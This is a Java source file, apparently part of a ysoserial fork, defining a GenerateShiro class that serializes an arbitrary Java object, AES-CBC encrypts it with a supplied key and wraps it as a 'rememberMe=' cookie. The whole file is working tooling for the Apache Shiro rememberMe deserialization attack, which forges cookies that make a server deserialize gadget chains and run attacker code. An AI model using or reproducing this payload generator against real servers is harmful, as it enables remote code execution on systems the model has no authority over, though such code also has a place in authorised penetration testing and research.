package ysoserial.features;

import com.mchange.v2.ser.SerializableUtils;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.xml.bind.DatatypeConverter;
import java.security.SecureRandom;


public class GenerateShiro {
    public static byte[] encrypt(byte[] plainText, String key) throws Exception {
        // base64 decode key
        byte[] bkeys = DatatypeConverter.parseBase64Binary(key);

        // Generating IV.
        int ivSize = 16;
        byte[] iv = new byte[ivSize];
        SecureRandom random = new SecureRandom();
        random.nextBytes(iv);
        IvParameterSpec ivParameterSpec = new IvParameterSpec(iv);

        // init key.
        SecretKeySpec secretKeySpec = new SecretKeySpec(bkeys, "AES");

        // Encrypt.
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec, ivParameterSpec);
        byte[] encrypted = cipher.doFinal(plainText);

        // Combine IV and encrypted part.
        byte[] encryptedIvandtext = new byte[ivSize + encrypted.length];
        System.arraycopy(iv, 0, encryptedIvandtext, 0, ivSize);
        System.arraycopy(encrypted, 0, encryptedIvandtext, ivSize, encrypted.length);

        return encryptedIvandtext;
    }

    public static String sendpayload(Object payload, String key) throws Exception {
        byte[] serpayload = SerializableUtils.toByteArray(payload);
        byte[] encryptpayload = GenerateShiro.encrypt(serpayload, key);

        return "rememberMe=" + DatatypeConverter.printBase64Binary(encryptpayload);
    }

}
